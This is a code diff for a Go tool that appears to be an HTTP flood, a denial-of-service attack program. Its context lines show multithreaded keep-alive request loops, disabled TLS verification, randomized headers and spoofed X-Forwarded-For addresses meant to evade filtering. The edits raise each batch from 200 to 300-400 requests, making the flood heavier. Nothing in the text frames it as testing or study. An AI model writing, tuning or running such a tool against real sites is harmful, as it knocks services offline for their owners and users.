@@ -21,7 +21,7 @@ var (
     threads       int
     timer         int
     customHost    string
-    httpMethods   = []string{"GET", "POST", "HEAD"} // Random HTTP methods
+    httpMethods   = []string{"GET", "POST"} // Random HTTP methods
 )
 
 func init() {
@@ -137,7 +137,7 @@ func getHeader(method string) (string, []byte) {
     header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
     header += "Accept-Encoding: gzip, deflate, br\r\n"
     header += fmt.Sprintf("Accept-Language: %s\r\n", languages[rand.Intn(len(languages))])
-	header += fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+    header += fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
     header += "Connection: keep-alive\r\n"
     header += "Cache-Control: no-cache\r\n"
     header += fmt.Sprintf("Referer: https://%s\r\n", hostHeader)
@@ -186,9 +186,10 @@ func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
     defer wg.Done()
 
     tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: ip}
+    method := httpMethods[rand.Intn(len(httpMethods))]
+    randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
     for count := range requestCount {
         for {
-            randomIP := ips[rand.Intn(len(ips))] // Pick a random resolved IP
             address := fmt.Sprintf("%s:%d", randomIP, port)
 
             var conn net.Conn
@@ -206,7 +207,6 @@ func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
             }
 
             for i := 0; i < count; i++ {
-                method := httpMethods[rand.Intn(len(httpMethods))]
                 header, body := getHeader(method)
                 _, err := conn.Write([]byte(header))
                 if err != nil {
@@ -281,7 +281,7 @@ func main() {
         for t := 0; t < timer; t++ {
             <-ticker.C
             for i := 0; i < threads; i++ {
-                requestCount <- 200
+                requestCount <- rand.Intn(100)+300 // 300-400 requests
             }
         }
         close(requestCount)
